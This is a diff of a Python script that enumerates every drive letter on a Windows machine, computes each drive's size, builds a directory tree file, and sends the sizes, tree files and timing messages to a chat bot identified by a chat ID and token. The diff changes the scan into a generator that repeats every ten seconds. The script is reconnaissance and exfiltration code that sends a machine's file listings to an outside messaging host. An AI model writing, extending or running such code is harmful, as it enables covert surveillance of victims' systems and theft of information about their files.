@@ -113,18 +113,20 @@ def process_path(chat_id, token, disk):
         temp_file_path = temp_file.name
     return disk, temp_file_path
 
-def scan_disks(parameter):
+def scan_disks(parameter, interval):
     maj_letters = list(string.ascii_uppercase)
-    disks = []
-    for maj_letter in maj_letters:
-        letterpath = f"{maj_letter}:\\"
-        if os.path.isdir(letterpath):
-            if parameter == 1:
-                disks.append(letterpath)
-            elif parameter == 2:
-                if not (os.path.isdir(letterpath + "Windows\\system32") or os.path.isdir("/usr/bin")):
+    while True:
+        disks = []
+        for maj_letter in maj_letters:
+            letterpath = f"{maj_letter}:\\"
+            if os.path.isdir(letterpath):
+                if parameter == 1:
                     disks.append(letterpath)
-    return disks
+                elif parameter == 2:
+                    if not (os.path.isdir(letterpath + "Windows\\system32") or os.path.isdir("/usr/bin")):
+                        disks.append(letterpath)
+        yield disks
+        time.sleep(interval)
 
 def get_folder_size(folder_path):
     total_size = 0
@@ -155,29 +157,27 @@ def format_size(size_bytes):
 #Scan all available disks function
 #Param 1 : for all disks
 #Param 2 : for no OS disks
-disks = scan_disks(1)
-
-#For disk in list
-for disks in disks:
-    #Calcul disk size
-    total_size = get_folder_size(disks)
-    total_size = format_size(total_size)
-    #Send infos
-    send_message(chat_id, token, disks + " : " + total_size + " go")
-    #Print infos
-    print(f"Starting tree : {disks}, total size : {str(total_size)} go")
-    #Start timer
-    start_time = time.time()
-    #Tree
-    disk, temp_file_path = process_path(chat_id, token, disks)
-    #Stop timer
-    end_time = time.time()
-    #Send file
-    send_file(chat_id, token, temp_file_path)
-    #Calcul time to make action
-    elapsed_time = end_time - start_time
-    #Send
-    send_message(chat_id, token, "Done in : " + str(elapsed_time) + " seconds")
-    #Print infos
-    print(f"Done in {str(elapsed_time)} seconds")
-    sys.exit()
+for disks in scan_disks(1, 10):
+    for disks in disks:
+        #Calcul disk size
+        total_size = get_folder_size(str(disks))
+        total_size = format_size(total_size)
+        #Send infos
+        send_message(chat_id, token, disks + " : " + total_size + " go")
+        #Print infos
+        print(f"Starting tree : {disks}, total size : {str(total_size)} go")
+        #Start timer
+        start_time = time.time()
+        #Tree
+        disk, temp_file_path = process_path(chat_id, token, disks)
+        #Stop timer
+        end_time = time.time()
+        #Send file
+        send_file(chat_id, token, temp_file_path)
+        #Calcul time to make action
+        elapsed_time = end_time - start_time
+        #Send
+        send_message(chat_id, token, "Done in : " + str(elapsed_time) + " seconds")
+        #Print infos
+        print(f"Done in {str(elapsed_time)} seconds")
+        sys.exit()
